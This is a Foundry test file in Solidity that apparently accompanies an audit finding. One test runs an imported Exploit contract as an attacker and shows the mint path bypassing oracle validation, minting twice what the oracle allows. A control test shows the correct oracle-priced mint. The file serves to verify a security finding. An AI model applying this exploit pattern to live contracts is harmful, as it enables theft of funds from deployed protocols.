// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {
    Erc20,
    Exploit,
    IOracle,
    LiquidityWindow,
    OracleAdapterChecked
} from "./64791-mint-pricing-bypasses-oracle-validation-spearbit-none-buck-l.sol";

contract Finding64791Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_view_path_mints_more_than_the_oracle_allows() public {
        Exploit e = new Exploit();
        vm.prank(ATTACKER);
        e.run();

        assertEq(e.minted(), 100 ether, "minted");
        assertEq(e.allowed(), 50 ether, "oracle allows");
        assertEq(e.cap().balanceOf(ATTACKER), 100 ether, "attacker cap");
        assertGt(e.minted(), e.allowed(), "minted exceeds oracle");

        console2.log("minted", e.minted());
        console2.log("oracle allows", e.allowed());
    }

    function test_control_mint_uses_the_oracle_price() public {
        Erc20 cap = new Erc20("Buck Cap", "CAP");
        Erc20 usdc = new Erc20("USD Coin", "USDC");
        OracleAdapterChecked oracle = new OracleAdapterChecked(1 ether, 2 ether);
        LiquidityWindow window = new LiquidityWindow(usdc, cap, IOracle(address(oracle)));

        usdc.mint(address(this), 100 ether);
        usdc.approve(address(window), 100 ether);
        uint256 minted = window.mint(100 ether);

        (uint256 price,) = oracle.latestPrice();
        assertEq(price, 2 ether, "oracle price");
        assertEq(minted, 50 ether, "control mints the oracle amount");
        assertEq(cap.balanceOf(address(this)), 50 ether, "balance");

        console2.log("control price", price);
        console2.log("control minted", minted);
    }
}
